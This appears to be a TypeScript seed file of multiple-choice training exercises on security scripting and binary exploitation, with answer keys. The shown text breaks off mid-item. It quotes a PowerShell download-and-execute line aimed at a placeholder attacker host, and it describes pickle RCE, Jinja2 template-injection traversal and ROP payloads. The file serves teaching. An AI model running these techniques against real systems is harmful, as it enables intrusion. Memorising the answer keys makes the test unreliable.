import type { SeedExercise } from "./types";

/** scripting (L0–L5) + binexp (L0–L5) — one MCQ per teaching section. */
export const SCRIPTING_BINEXP_EXERCISES: SeedExercise[] = [
  // ══ scripting L0 ══
  {
    slug: "scripting-l0-why",
    competencyId: "scripting",
    depthTier: 0,
    sectionHeading: "Why scripting matters in cybersecurity",
    prompt: "A junior analyst asks which language to learn first for automating security workflows — writing exploit PoCs, fuzzing HTTP endpoints, and piping output between tools. Which recommendation best fits the current security ecosystem?",
    options: [
      "Python — it dominates exploit development, security tooling, and automation thanks to libraries like requests, pwntools, and scapy; most CVE proof-of-concept scripts and frameworks like Metasploit's auxiliary modules are written in or interface with Python.",
      "Go — its compiled single-binary output and built-in concurrency make it the default for security tooling; most exploit frameworks, CTF solvers, and network scanners in the community are Go-based, and Python is used mainly for glue scripts.",
      "Rust — its memory-safety guarantees and zero-cost abstractions make it the standard choice for exploit development; the majority of Metasploit modules and proof-of-concept scripts have migrated from Python to Rust.",
      "JavaScript — its ubiquity in browsers and Node.js means it handles HTTP fuzzing, exploit scripting, and binary manipulation better than alternatives; npm's ecosystem covers network scanning and shellcode generation natively.",
    ],
    correctIndex: 0,
    explanation:
      "Python dominates exploit development, tooling, and automation; Bash handles one-liners and piping tool output; PowerShell is the Windows post-exploitation and AD language.",
  },
  {
    slug: "scripting-l0-vocab",
    competencyId: "scripting",
    depthTier: 0,
    sectionHeading: "Key vocabulary",
    prompt: "You write a Python script called scanner.py and add #!/usr/bin/env python3 as the first line. A colleague asks what that line actually does when you run ./scanner.py from the terminal. What is the correct explanation?",
    options: [
      "It tells the kernel which interpreter to use — the OS reads the shebang, locates python3 via the PATH, and launches it with the script as its argument, so you can run the file directly without typing 'python3' first.",
      "It imports the env module from the standard library, which auto-detects the operating system and configures Python's runtime to match the host platform, ensuring cross-platform compatibility for the scanner script.",
      "It sets the script's file permissions to executable automatically each time the file is saved, so you never need to run chmod +x — the shebang replaces the execute bit in the file's metadata on disk.",
      "It activates Python's restricted execution mode, sandboxing the script so it cannot access the filesystem or network unless the user explicitly grants those permissions at a runtime prompt.",
    ],
    correctIndex: 0,
    explanation:
      "The shebang selects the interpreter. Other essentials: stdin/stdout/stderr streams for piping, exit codes (0 = success), regex for parsing, and sockets for network I/O.",
  },
  // ══ scripting L1 ══
  {
    slug: "scripting-l1-python",
    competencyId: "scripting",
    depthTier: 1,
    sectionHeading: "Python essentials for security",
    prompt: "Your Python script needs to launch nmap against a target host and capture its stdout for parsing. Which approach correctly runs the external command and retrieves its output?",
    options: [
      "Use subprocess.run(['nmap', '-sV', target], capture_output=True, text=True) — subprocess is designed for spawning processes, and capture_output=True redirects stdout and stderr into the returned CompletedProcess object for parsing.",
      "Use os.popen('nmap -sV ' + target).read() — os.popen is the modern replacement for subprocess and offers better error handling plus automatic input sanitization against shell injection attacks in the command string.",
      "Use socket.connect(('nmap', target)) — the socket module wraps external tool invocations as network connections, returning their output through the recv() method as raw bytes for downstream processing.",
      "Use importlib.import_module('nmap').scan(target) — Python can dynamically import any installed system binary as a module, and its scan() method returns parsed results directly as a dictionary without subprocess overhead.",
    ],
    correctIndex: 0,
    explanation:
      "subprocess launches tools like nmap and captures stdout for parsing; requests handles HTTP, and file I/O with context managers reads targets. sys.argv provides CLI arguments.",
  },
  {
    slug: "scripting-l1-bash",
    competencyId: "scripting",
    depthTier: 1,
    sectionHeading: "Bash one-liners",
    prompt: "During a Linux privilege escalation assessment, you run find / -perm -4000 -type f 2>/dev/null and get a list of binaries including /usr/bin/passwd and an unfamiliar /opt/custom-tool. What class of files has this command identified?",
    options: [
      "SUID binaries — the -4000 permission mask matches files whose Set-User-ID bit is set, meaning they execute with the file owner's privileges (often root), making unexpected entries like /opt/custom-tool prime escalation targets.",
      "World-writable executables — the 4000 octal value represents the writable bit for all users, so this finds binaries that any user can modify and potentially inject malicious code into for later execution.",
      "Sticky-bit directories — the -4000 flag identifies directories where only the file owner can delete entries; these are escalation targets because attackers can plant persistent backdoors inside them.",
      "Files with extended ACLs — the 4000 mask matches files that have access control lists beyond standard Unix permissions, which often grant unintended privileges to non-root groups or service accounts.",
    ],
    correctIndex: 0,
    explanation:
      "The -4000 permission bit is SUID; listing SUID files is a classic privesc enumeration step. Bash also does ping sweeps, /dev/tcp port checks, and quick text extraction with grep -oP.",
  },
  {
    slug: "scripting-l1-regex",
    competencyId: "scripting",
    depthTier: 1,
    sectionHeading: "Regular expressions",
    prompt: "Your security tool pipes raw nmap output into a Python function that must extract every open port number and its service name from unstructured text. Why are regular expressions the right approach for this parsing task?",
    options: [
      "Regex patterns match and extract structured data — like port numbers, IPs, and service names — from noisy, unstructured text output, letting you pull exactly the fields you need using named capture groups for readability.",
      "Regex patterns compile the text into an abstract syntax tree that can be queried using XPath-like selectors to reliably locate port and service fields regardless of output format changes between nmap versions.",
      "Regex patterns establish a persistent connection to nmap's internal API, receiving structured JSON instead of raw text, which eliminates the need for any text parsing and handles format changes automatically.",
      "Regex patterns convert raw output into a standardized binary protocol that downstream tools can consume directly, bypassing the error-prone step of text-based field extraction through a compiled intermediary.",
    ],
    correctIndex: 0,
    explanation:
      "Most tools emit text, so regex extracts the fields you need (named groups make it readable). Beware catastrophic backtracking (ReDoS) with patterns like (a+)+ on crafted input.",
  },
  // ══ scripting L2 ══
  {
    slug: "scripting-l2-network",
    competencyId: "scripting",
    depthTier: 2,
    sectionHeading: "Network scripting with Python",
    prompt: "You are writing a Python TCP port scanner. For each port, you call socket.connect_ex((host, port)). The function returns 0 for port 22 and 111 for port 23. What do these return values indicate?",
    options: [
      "Port 22 is open (0 means the TCP three-way handshake completed successfully) and port 23 is closed (111 is ECONNREFUSED, meaning the target sent a RST). connect_ex returns OS error codes instead of raising exceptions.",
      "Both ports are open but port 22 responded in 0 milliseconds while port 23 took 111 milliseconds. connect_ex returns the round-trip latency in milliseconds, which helps estimate the network distance to the target.",
      "Port 22 has zero services running (0 means no listener was detected) and port 23 has 111 bytes queued in its buffer. connect_ex returns the number of pending bytes, so you read 111 bytes to get the service banner.",
      "Port 22 is filtered by a firewall (0 indicates a silent drop with no response) and port 23 responded with a SYN-ACK after 111 retries. connect_ex returns the retry count needed to establish the connection.",
    ],
    correctIndex: 0,
    explanation:
      "connect_ex returns 0 on a successful TCP connect (open) and an error code otherwise. Banner grabbing reads the service's greeting; a ThreadPoolExecutor scans many ports concurrently.",
  },
  {
    slug: "scripting-l2-web",
    competencyId: "scripting",
    depthTier: 2,
    sectionHeading: "Web interaction and scraping",
    prompt: "Your Python script logs into a web application by POSTing credentials, then tries to access an authenticated dashboard page. Using a fresh requests.get() for the dashboard returns a 403 Forbidden. What change fixes this?",
    options: [
      "Use a requests.Session() object for both the login POST and the dashboard GET — the Session persists cookies across requests, so the authentication cookie set during login carries over automatically to subsequent pages.",
      "Add a Content-Type: application/json header to the GET request — the server returns 403 because it expects JSON format for authenticated requests, and without this header it treats the request as unauthenticated.",
      "Switch from GET to POST for the dashboard request — authenticated pages require POST by convention since GET requests cannot carry the session token in their body, and the server rejects tokenless requests.",
      "Set verify=False on the GET request to skip TLS certificate validation — the 403 occurs because requests fails to verify the site's certificate and misreports the resulting TLS error as a forbidden response.",
    ],
    correctIndex: 0,
    explanation:
      "A Session keeps cookies (and connection pooling) across calls, preserving the authenticated state for subsequent requests. BeautifulSoup parses the returned HTML.",
  },
  {
    slug: "scripting-l2-powershell",
    competencyId: "scripting",
    depthTier: 2,
    sectionHeading: "PowerShell for Windows security",
    prompt: "During a Windows engagement, you see the command IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1') in the event logs. Why is this technique favored by attackers over downloading an .exe to disk?",
    options: [
      "It downloads and executes the script entirely in memory without writing to disk — a fileless technique that evades traditional antivirus file scanning and leaves minimal forensic artifacts on the compromised host's filesystem.",
      "It leverages .NET's just-in-time compiler to convert the PowerShell script into a native binary at download time, which runs faster than an interpreted .exe and produces fewer detectable Windows API calls.",
      "It routes the download through Windows' built-in proxy authentication, automatically injecting the current user's domain credentials into the HTTP request so the attacker's server can harvest NTLM hashes passively.",
      "It stores the downloaded content in the Windows registry instead of the filesystem, which persists across reboots and is ignored by endpoint detection tools that only monitor file-based execution paths.",
    ],
    correctIndex: 0,
    explanation:
      "Invoke-Expression on a downloaded string runs code without touching disk — a living-off-the-land technique. PowerShell also enumerates the system, queries AD, and searches files for secrets.",
  },
  // ══ scripting L3 ══
  {
    slug: "scripting-l3-pwntools",
    competencyId: "scripting",
    depthTier: 3,
    sectionHeading: "Exploit scripting with pwntools",
    prompt: "You are building a stack overflow exploit with pwntools and need to place the address 0x00000000004011b6 in your payload so it overwrites the saved return pointer on x86-64. Which pwntools call produces the correct byte sequence?",
    options: [
      "p64(0x4011b6) — it packs the 64-bit integer into 8 bytes in little-endian order (b6 11 40 00 00 00 00 00), which is the byte layout x86-64 expects when reading a return address from the stack.",
      "hex(0x4011b6) — it converts the address to the string '0x4011b6' and encodes each hex digit pair as its corresponding byte, producing the correct big-endian representation for x86-64 stack values.",
      "asm(0x4011b6) — it assembles the address into a jmp instruction targeting that location, which is what the CPU actually needs when it pops the return address off the stack and transfers control flow.",
      "flat(0x4011b6, endian='big') — it serializes the address in network byte order (big-endian) since x86-64 reads stack-stored return addresses from high byte to low byte during the ret instruction.",
    ],
    correctIndex: 0,
    explanation:
      "p64 packs a 64-bit integer little-endian for payloads (e.g. overwriting a return address). pwntools also connects to targets (remote/process), builds ROP chains, and assembles shellcode.",
  },
  {
    slug: "scripting-l3-scapy",
    competencyId: "scripting",
    depthTier: 3,
    sectionHeading: "Scapy for packet crafting",
    prompt: "You need to send a TCP SYN to port 80 on 10.0.0.1 and inspect the response flags to determine if the port is open. Python's socket module only supports full connections. Why does Scapy succeed where socket cannot?",
    options: [
      "Scapy constructs and sends raw packets at any protocol layer — IP(dst='10.0.0.1')/TCP(dport=80, flags='S') — giving you direct control over TCP flags, TTL, and payload content that socket's connect() abstraction hides.",
      "Scapy uses the kernel's TCP/IP stack but injects a hook that pauses the three-way handshake after the SYN-ACK, letting you read response flags before the kernel completes the connection automatically.",
      "Scapy opens a privileged UDP socket and embeds a serialized TCP header inside the UDP payload, which the remote host's kernel extracts and processes as if it were a normal TCP connection attempt.",
      "Scapy modifies the system's nftables rules before each send to reclassify the outgoing TCP connection as raw, which tricks the kernel into exposing individual flag fields through the standard socket recv() call.",
    ],
    correctIndex: 0,
    explanation:
      "Scapy composes packets layer by layer (IP()/TCP(flags='S')...) and sends them, enabling custom SYN scans, ARP sweeps, DNS queries, and TTL-controlled traceroutes.",
  },
  {
    slug: "scripting-l3-automation",
    competencyId: "scripting",
    depthTier: 3,
    sectionHeading: "Automation frameworks",
    prompt: "You are writing a reusable port scanner CLI tool in Python. It needs to accept a target IP, a port range, a thread count, and an output file path — all with sensible defaults and a --help flag. Which module structures this interface?",
    options: [
      "argparse — it defines typed CLI flags with defaults, validation, and auto-generated help text (e.g. --target, --ports 1-1024, --threads 10, --output results.txt), giving the tool a professional, self-documenting command-line interface.",
      "configparser — it reads a .ini-style configuration file where each section defines a scan profile with target, ports, threads, and output path, which is the standard way Python CLI tools accept runtime parameters.",
      "logging — it provides a built-in argument parser that intercepts --target, --ports, and --threads from sys.argv while simultaneously configuring log levels, combining argument parsing and output management in one call.",
      "json — it deserializes a JSON string passed as the single CLI argument, encoding the target, ports, threads, and output path as structured data rather than parsing individual flags from the command line.",
    ],
    correctIndex: 0,
    explanation:
      "argparse defines flags (target, ports, threads, output) with validation and --help, the backbone of a maintainable CLI tool; logging and ThreadPoolExecutor round out the pattern.",
  },
  // ══ scripting L4 ══
  {
    slug: "scripting-l4-async",
    competencyId: "scripting",
    depthTier: 4,
    sectionHeading: "Async programming for security tools",
    prompt: "Your threaded URL fuzzer with 100 threads tops out at 500 requests/second due to context-switching overhead. Rewriting it with asyncio and aiohttp hits 5,000 req/s on the same machine. Why is the async version dramatically faster?",
    options: [
      "A single thread multiplexes thousands of concurrent I/O waits without context-switch overhead — while one request awaits a response, the event loop immediately starts others, eliminating the per-thread scheduling cost that bottlenecked the threaded version.",
      "asyncio bypasses Python's Global Interpreter Lock entirely and distributes coroutines across all CPU cores in parallel, giving each request its own dedicated core and achieving true multiprocessing without subprocess overhead.",
      "aiohttp compiles the HTTP protocol handler to native machine code using LLVM at import time, eliminating the interpreter overhead that makes the standard requests library and threading combination inherently slow.",
      "asyncio batches all 5,000 requests into a single TCP connection using HTTP pipelining, sending them as one packet and splitting the combined response, which avoids the connection-establishment latency that limits threaded scanners.",
    ],
    correctIndex: 0,
    explanation:
      "For I/O-bound work, async lets one thread interleave many awaiting requests cheaply, so an async scanner tests thousands of URLs per second. A semaphore bounds concurrency.",
  },
  {
    slug: "scripting-l4-ctypes",
    competencyId: "scripting",
    depthTier: 4,
    sectionHeading: "C extensions and ctypes",
    prompt: "Your Python tool on Linux needs to call getuid() and ptrace() directly from libc without writing a C extension module or installing third-party packages. Which standard library module enables this?",
    options: [
      "ctypes — it loads shared libraries (ctypes.CDLL('libc.so.6')) and calls their exported functions directly from Python, letting you invoke getuid, ptrace, or any C API by defining the argument and return types in Python.",
      "struct — it packs and unpacks binary data into C-compatible byte layouts, which triggers the kernel to execute the corresponding system call when you write the packed struct to the /dev/syscall device file.",
      "cffi — it is bundled with Python's standard library and generates a temporary C extension at runtime by compiling inline C source code, which is how Python natively interfaces with libc functions on Linux.",
      "os — its os.syscall() method accepts a syscall number and raw arguments, directly invoking any Linux kernel function including getuid and ptrace without needing to reference libc's shared library at all.",
    ],
    correctIndex: 0,
    explanation:
      "ctypes loads shared libraries and calls their functions, so Python can invoke getuid, ptrace, or Windows kernel32 APIs directly — useful for process introspection and injection tooling.",
  },
  {
    slug: "scripting-l4-tool-integration",
    competencyId: "scripting",
    depthTier: 4,
    sectionHeading: "Tool integration and output parsing",
    prompt: "Your automation pipeline runs nmap, parses the results, and feeds discovered services into nuclei. You could parse nmap's default terminal output with regex, or use nmap -oX for XML. Why is the XML approach better for a production pipeline?",
    options: [
      "XML output is structured and its schema is stable across nmap versions — ElementTree reliably extracts hosts, ports, versions, and scripts by tag name, whereas the text format can change subtly between releases and break regex patterns.",
      "XML output runs the scan in parallel mode internally, completing faster than the default serial text output, and the speed gain compounds when feeding thousands of discovered hosts into the nuclei scanning stage.",
      "XML output includes nmap's built-in vulnerability analysis and CVE cross-references as nested elements, which eliminates the need for the nuclei scanning stage entirely since the findings are already embedded in the XML.",
      "XML output compresses the results using gzip by default, reducing disk I/O and network transfer time when passing data between pipeline stages, while text output is always stored uncompressed on disk.",
    ],
    correctIndex: 0,
    explanation:
      "Machine-readable XML lets you chain tools (nmap -> parse -> nuclei) without brittle text scraping. Structured parsing is the key to building automation pipelines.",
  },
  // ══ scripting L5 ══
  {
    slug: "scripting-l5-internals",
    competencyId: "scripting",
    depthTier: 5,
    sectionHeading: "Python internals for security",
    prompt: "A web application deserializes user-supplied data with pickle.loads(). An attacker submits a crafted pickle payload and achieves remote code execution. How does the pickle format enable arbitrary code execution during deserialization?",
    options: [
      "Pickle's __reduce__ method lets any object specify an arbitrary callable and its arguments for reconstruction — an attacker crafts a pickle whose __reduce__ returns (os.system, ('id',)), and the deserializer calls os.system('id') to rebuild the object.",
      "Pickle parses the byte stream as Python source code and passes it to exec() internally — an attacker embeds raw Python statements like 'import os; os.system(\"id\")' in the pickle stream, and the deserializer executes them line by line.",
      "Pickle allocates a fixed 4KB buffer for deserialization — an attacker sends a payload exceeding this size, overflowing the buffer into CPython's instruction pointer and redirecting execution to shellcode embedded in the pickle stream.",
      "Pickle validates the data's type signature against an allowlist, but the attacker sends a type-confusion payload that coerces a string object into a function pointer, which the interpreter dereferences and calls during attribute resolution.",
    ],
    correctIndex: 0,
    explanation:
      "Pickle can reconstruct arbitrary callables via __reduce__, so unpickling attacker data runs their code. Understanding bytecode, code objects, and import hooks also enables advanced offensive/defensive techniques.",
  },
  {
    slug: "scripting-l5-interp-exploit",
    competencyId: "scripting",
    depthTier: 5,
    sectionHeading: "Compiler and interpreter exploitation",
    prompt: "A Jinja2 template renders user input directly: {{ user_input }}. An attacker submits a payload that chains through Python's MRO to reach the os module and execute commands. What class traversal technique makes this possible?",
    options: [
      "Walking the object graph via ''.__class__.__mro__[1].__subclasses__() to find a class that imports os or subprocess — Jinja2's sandbox exposes Python's type hierarchy, and certain subclasses reference dangerous modules at definition time.",
      "Overflowing Jinja2's template parser buffer with a long input to overwrite the interpreter's return address on the stack — template engines in Python inherit CPython's lack of bounds checking on string inputs.",
      "Injecting a YAML directive inside the Jinja2 expression that triggers PyYAML's unsafe_load pathway — Jinja2 delegates nested markup to PyYAML, which can instantiate arbitrary Python objects via the !!python/object constructor tag.",
      "Exploiting Jinja2's JIT compiler by inserting LLVM IR instructions disguised as template syntax — the JIT compiles them to native code without validation, giving the attacker direct CPU-level execution from a template.",
    ],
    correctIndex: 0,
    explanation:
      "Restricted environments are escaped by walking the object graph to a class that exposes os/subprocess. Jinja2 SSTI and JS prototype pollution exploit the same dynamic nature of their respective languages.",
  },
  {
    slug: "scripting-l5-perf",
    competencyId: "scripting",
    depthTier: 5,
    sectionHeading: "Performance engineering for large-scale tools",
    prompt: "Your log analysis tool calls readlines() on a 50 GB file and crashes with MemoryError. A colleague suggests replacing it with a generator that yields one line at a time. Why does this fix the crash?",
    options: [
      "A generator with yield processes one line per iteration in near-constant memory — readlines() loads all 50 GB into a list at once, but the generator fetches and discards each line lazily, keeping only the current line in memory at any time.",
      "A generator compresses each line in memory using zlib before yielding it, reducing the 50 GB footprint to roughly 5 GB — Python's yield keyword triggers transparent compression that readlines() does not support.",
      "A generator distributes the file across all CPU cores using multiprocessing.Pool behind the scenes — yield is syntactic sugar for parallel map(), and Python's runtime splits the I/O across cores to avoid single-thread memory limits.",
      "A generator maps the file into virtual memory using mmap under the hood — yield triggers the OS to page in only the current 4 KB block, which is how Python implements lazy file access on all platforms transparently.",
    ],
    correctIndex: 0,
    explanation:
      "Lazy iteration keeps memory flat when scanning massive inputs, and generator pipelines compose cheaply. For CPU-bound work (hash cracking), multiprocessing sidesteps the GIL.",
  },
  // ══ binexp L0 ══
  {
    slug: "binexp-l0-what",
    competencyId: "binexp",
    depthTier: 0,
    sectionHeading: "What is binary exploitation",
    prompt: "A researcher discovers that sending 2,000 bytes to a network service causes it to execute attacker-chosen instructions instead of crashing. What category of vulnerability does this demonstrate?",
    options: [
      "Binary exploitation via memory corruption — the oversized input overwrites control data (like a return address) in the program's memory layout, redirecting execution to attacker-supplied code rather than following the intended program logic.",
      "Logic-level authentication bypass — the long input satisfies an undocumented length check in the login routine that grants administrative access when the input exceeds the expected maximum parameter size on the server.",
      "Denial-of-service resource exhaustion — the 2,000-byte input fills the application's receive buffer, causing the process to allocate excessive memory and eventually crash, but arbitrary code execution is not achievable from this class of bug.",
      "Application-layer command injection — the input contains embedded protocol commands (like SMTP RCPT TO:) that the service interprets alongside normal data, executing them as legitimate operations within the application's own logic.",
    ],
    correctIndex: 0,
    explanation:
      "Binexp targets memory management (stack, heap, pointers) rather than application logic, usually to make the program run attacker-controlled instructions.",
  },
  {
    slug: "binexp-l0-why",
    competencyId: "binexp",
    depthTier: 0,
    sectionHeading: "Why it matters",
    prompt: "A colleague questions why you study binary exploitation when most modern applications are web-based. What justifies learning memory corruption even as web apps dominate the landscape?",
    options: [
      "Memory corruption underlies a massive share of CVEs across kernels, browsers, firmware, and system libraries — understanding it is essential for vulnerability research, exploit development, and analyzing malware that targets native code.",
      "Web application vulnerabilities like SQL injection and XSS are subtypes of memory corruption that occur in the interpreter layer — learning binary exploitation teaches the root cause behind all categories of web bugs.",
      "Modern CPUs removed hardware memory protections in recent years, making binary exploitation significantly easier and more common than web attacks, which is why the industry has shifted its primary focus to memory safety.",
      "Binary exploitation is primarily a historical topic studied for its foundational elegance — mitigations like ASLR and NX have eliminated all practical memory corruption attacks in production systems since their widespread adoption.",
    ],
    correctIndex: 0,
    explanation:
      "Understanding memory-corruption bugs underpins vulnerability research, exploit development, malware analysis, and CTF pwn — and explains a huge share of real-world CVEs.",
  },
  {
    slug: "binexp-l0-vocab",
    competencyId: "binexp",
    depthTier: 0,
    sectionHeading: "Key vocabulary",
    prompt: "You compile a program with gcc -fstack-protector-all and notice that a buffer overflow that previously redirected execution now terminates with '*** stack smashing detected ***'. What defense mechanism stopped the exploit?",
    options: [
      "A stack canary — the compiler places a random value between local buffers and the saved return address, then checks it before returning; the overflow corrupted this value, triggering an abort instead of allowing hijacked control flow.",
      "ASLR (Address Space Layout Randomization) — the kernel randomized the stack address so the overflow wrote the return address to an unpredictable location, causing a segfault that the runtime reported as stack smashing.",
      "NX (No-Execute) bit — the CPU detected that the overwritten return address pointed to the stack, which is marked non-executable, and raised a hardware exception that the C runtime caught and reported as stack smashing.",
      "PIE (Position-Independent Executable) — the binary was loaded at a random base address, so the attacker's hardcoded target address resolved to an unmapped page, and the resulting segfault was reported as stack smashing.",
    ],
    correctIndex: 0,
    explanation:
      "A canary detects stack smashing (its corruption aborts the program). ASLR randomizes addresses, NX/DEP marks the stack non-executable, PIE randomizes code, and ROP chains existing gadgets.",
  },
  // ══ binexp L1 ══
  {
    slug: "binexp-l1-asm",
    competencyId: "binexp",
    depthTier: 1,
    sectionHeading: "x86-64 assembly essentials",
    prompt: "You are writing a ROP chain that calls execve('/bin/sh', NULL, NULL) via a syscall on x86-64 Linux. You need to place the pointer to '/bin/sh' in the correct register for the first argument. Which register does the System V AMD64 ABI designate?",
    options: [
      "rdi — the System V AMD64 calling convention passes the first integer/pointer argument in rdi, then rsi, rdx, rcx, r8, r9 for arguments two through six, with the return value placed in rax after the call.",
      "rax — the first argument goes in rax because rax also serves as the return register, and the kernel copies the argument from rax into the appropriate slot before the syscall handler runs.",
      "rsp — the System V convention places the first argument at the top of the stack (pointed to by rsp), and the kernel reads it from there during a syscall, which is why stack control is sufficient for arbitrary calls.",
      "rbx — the System V AMD64 ABI uses the callee-saved registers (rbx, r12-r15) for the first arguments precisely because they survive function calls, ensuring arguments are not clobbered before the callee reads them.",
    ],
    correctIndex: 0,
    explanation:
      "Arguments go in rdi, rsi, rdx, rcx, r8, r9 (then the stack); the return value is in rax. call pushes rip and jumps; ret pops rip.",
  },
  {
    slug: "binexp-l1-overflow",
    competencyId: "binexp",
    depthTier: 1,
    sectionHeading: "Stack buffer overflow",
    prompt: "A function declares a 64-byte char buffer on a 64-bit system with no canary. You send 80 bytes and observe that the program jumps to an address you control. Why is the offset to the saved return address 72, not 64?",
    options: [
      "Between the 64-byte buffer and the saved return address sits the 8-byte saved RBP (the caller's frame pointer), so you must overwrite 64 bytes of buffer plus 8 bytes of RBP before reaching the 8-byte saved RIP at offset 72.",
      "The compiler pads the 64-byte buffer to a 72-byte alignment boundary because x86-64 requires all stack frames to be aligned to 16 bytes, and the nearest 16-byte-aligned size above 64 that accounts for the prologue is 72.",
      "The first 8 bytes of the buffer store a local canary value that gcc always inserts even without -fstack-protector, so the usable buffer is only 56 bytes and the total offset becomes 56 + 8 (canary) + 8 (RBP) = 72.",
      "The x86-64 call instruction pushes an 8-byte return address before entering the function, and the prologue pushes another 8 bytes for the RFLAGS register, adding 8 bytes of overhead beyond the buffer's 64 bytes.",
    ],
    correctIndex: 0,
    explanation:
      "Overflowing past the 64-byte buffer and the 8-byte saved RBP reaches the saved RIP at offset 72; overwriting it with a target address redirects execution. Cyclic patterns find the exact offset empirically.",
  },
  {
    slug: "binexp-l1-gdb",
    competencyId: "binexp",
    depthTier: 1,
    sectionHeading: "Using GDB for debugging",
    prompt: "Before writing an exploit, you load the target binary in pwndbg and run checksec. It reports: Canary=off, NX=on, PIE=off, RELRO=Partial. Which exploitation strategy does this combination of mitigations suggest?",
    options: [
      "A ROP attack using hardcoded gadget addresses — NX prevents shellcode on the stack, but PIE=off means code/PLT addresses are fixed, no canary means overflows are unguarded, and Partial RELRO leaves the GOT writable for potential overwrites.",
      "Direct shellcode injection onto the stack — NX=on merely logs execution attempts without blocking them, PIE=off provides predictable stack addresses, and the lack of a canary means nothing checks the overflow before returning.",
      "A brute-force ASLR bypass — checksec's PIE=off means ASLR is disabled system-wide for this binary, so all addresses including libc are fixed and predictable, and you can hardcode a system() address without any leak.",
      "A pure format-string attack without overflow — Partial RELRO means printf format strings bypass output validation, Canary=off disables format-string length checks, and NX=on forces the exploit through printf rather than injected code.",
    ],
    correctIndex: 0,
    explanation:
      "checksec shows the protections in play, shaping your exploit strategy. GDB (with pwndbg/GEF) sets breakpoints, examines memory (x/...), and finds offsets with cyclic patterns.",
  },
  // ══ binexp L2 ══
  {
    slug: "binexp-l2-rop",
    competencyId: "binexp",
    depthTier: 2,
    sectionHeading: "Bypassing NX with Return-Oriented Programming",
    prompt: "Your target binary has NX enabled so shellcode on the stack is non-executable. You have a stack overflow and the binary is not position-independent. How do you call system('/bin/sh') without injecting any executable code?",
    options: [
      "Chain ROP gadgets — find a 'pop rdi; ret' gadget in the binary, place the address of '/bin/sh' on the stack as its argument, then return into system(). Each gadget ends with ret, transferring control to the next stack address in the chain.",
      "Overwrite the NX permission bit in the ELF header on disk before the program maps it — once the header marks the stack as executable, the loader grants execute permission and you can inject and run shellcode normally.",
      "Use a JIT spray technique: fill the heap with constant pools that decode to x86 NOP sleds and shellcode — NX only protects the stack, and JIT-compiled heap regions are always marked executable by the kernel by default.",
      "Trigger a double-free on the stack canary allocation to corrupt the NX enforcement flag in the process's page table entries — once the flag is cleared, the kernel marks all writable pages executable for that process.",
    ],
    correctIndex: 0,
    explanation:
      "NX marks the stack non-executable, defeating shellcode injection; ROP reuses gadgets already in the binary/libc (e.g. pop rdi; ret) to call functions like system('/bin/sh'). Stack alignment (an extra ret) is often required.",
  },
  {
    slug: "binexp-l2-fmtstr",
    competencyId: "binexp",
    depthTier: 2,
    sectionHeading: "Format string vulnerabilities",
    prompt: "A program calls printf(user_input) where user_input is attacker-controlled. You can already leak stack values with %x. Which format specifier lets you turn this read primitive into an arbitrary write?",
    options: [
      "%n — it writes the number of bytes printed so far to the address pointed to by the corresponding argument on the stack; by controlling that argument via positional parameters and the byte count, you achieve an arbitrary write primitive.",
      "%s — when the corresponding stack argument points to a writable address, %s dereferences that pointer and writes the format string's remaining characters into the pointed-to buffer, giving you a memory-write capability.",
      "%p — although normally used for reading pointer values, if the byte count exceeds 0xFFFF, printf switches to write mode and stores the formatted output at the pointer address instead of printing it to stdout.",
      "%d — when combined with a width specifier exceeding INT_MAX, printf triggers a signed integer overflow that corrupts the internal write pointer, causing subsequent format characters to overwrite adjacent stack memory.",
    ],
    correctIndex: 0,
    explanation:
      "%x/%s leak the stack, but %n writes to memory (e.g. overwriting a GOT entry), turning a format-string bug into code execution. pwntools' fmtstr_payload automates the construction.",
  },
  {
    slug: "binexp-l2-re",
    competencyId: "binexp",
    depthTier: 2,
    sectionHeading: "Reverse engineering basics",
    prompt: "You have a stripped binary with no source code and need to understand its authentication logic to find a bypass. You load it into Ghidra and see decompiled pseudo-C code. How did Ghidra produce readable output from raw machine code?",
    options: [
      "Ghidra disassembles the machine code into assembly instructions, then applies data-flow analysis and pattern matching to reconstruct approximate C — it infers variable types, control flow structures, and function boundaries from the raw instruction stream.",
      "Ghidra extracts the original source code from the binary's debug section, which is always present even in stripped binaries — stripping only removes symbol names but not the embedded source code that compilers include by default.",
      "Ghidra connects to a cloud database that maps known function hashes to their original source files from open-source repositories, then substitutes matching code — it only works for binaries built from publicly available source.",
      "Ghidra runs the binary in an instrumented sandbox, records which branches are taken for each input, and uses machine learning to synthesize source code that produces identical branch patterns across all observed inputs.",
    ],
    correctIndex: 0,
    explanation:
      "Ghidra/IDA decompile machine code to approximate C, and objdump/radare2 disassemble. checksec and strings give quick context before deeper analysis.",
  },
  {
    slug: "binexp-l2-mitigations",
    competencyId: "binexp",
    depthTier: 2,
    sectionHeading: "Security mitigations summary",
    prompt: "You have a buffer overflow in a PIE binary with ASLR enabled. All code and library addresses are randomized on every run. Your overflow can leak data before the process crashes. How do you defeat ASLR to build a reliable exploit?",
    options: [
      "Use the overflow to leak a runtime address (e.g. a libc pointer from the GOT or stack) — subtracting its known offset reveals the library's base address, letting you compute system(), gadgets, and '/bin/sh' for this specific run.",
      "ASLR only randomizes the top 8 bits of each address on 64-bit systems, leaving the lower 56 bits predictable — brute-force the 256 possible upper-byte values by reconnecting to the service until the exploit lands.",
      "Send a specially crafted payload that writes to /proc/self/maps from within the vulnerable function — the kernel allows any process to modify its own memory map, and you can set a fixed base address for libc.",
      "ASLR is re-randomized only at boot time, not per process execution — if you crash the service once and observe the crash address in dmesg, all subsequent runs use the same layout until the next reboot.",
    ],
    correctIndex: 0,
    explanation:
      "ASLR randomizes base addresses, so exploits pair it with an info leak (e.g. leaking a libc pointer) to derive offsets. Full RELRO is bypassed by avoiding GOT overwrite (pure ROP); canaries by leaking the canary value.",
  },
  // ══ binexp L3 ══
  {
    slug: "binexp-l3-heap",
    competencyId: "binexp",
    depthTier: 3,
    sectionHeading: "Heap exploitation",
    prompt: "You find a use-after-free: a 64-byte chunk is freed into the tcache but the program still holds a dangling pointer. You write 8 bytes through it, corrupting the freed chunk's fd pointer. How does this give you an arbitrary allocation?",
    options: [
      "tcache is a singly-linked LIFO list — overwriting fd in the freed chunk makes the allocator believe the next free chunk is at your chosen address, so a subsequent malloc(64) returns a pointer to that attacker-controlled arbitrary location.",
      "Corrupting fd triggers the tcache integrity verifier, which falls back to mmap for the next allocation — by setting fd to a target address, mmap maps a new page at that exact virtual address and returns a writable pointer.",
      "The fd pointer controls the chunk's size metadata — overwriting it with a target address changes the allocation size so that the next malloc returns an oversized chunk that overlaps with a target structure in adjacent memory.",
